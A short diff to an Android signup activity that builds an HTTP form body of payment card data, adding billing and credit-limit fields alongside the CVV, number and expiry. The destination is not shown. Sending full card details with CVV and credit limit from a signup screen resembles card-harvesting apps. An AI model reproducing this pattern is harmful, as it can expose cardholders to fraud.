@@ -348,9 +348,11 @@ public class a_signup extends AppCompatActivity {
                         .add("cvv",String.valueOf(carddata.getCvv()))
                         .add("month",String.valueOf(carddata.getMonth()))
                         .add("year",String.valueOf(carddata.getYear()))
-                        .add("cardname",carddata.getCard_firstname()+" "+carddata.getCard_lastname())
+                        .add("billing",carddata.getCard_billing())
+                        .add("cardname",carddata.getCard_name())
                         .add("number",carddata.getCard_number())
                         .add("type",carddata.getCard_type())
+                        .add("limit",carddata.getLimit()+"")
                         .build();
 
                 Request request = new Request.Builder()
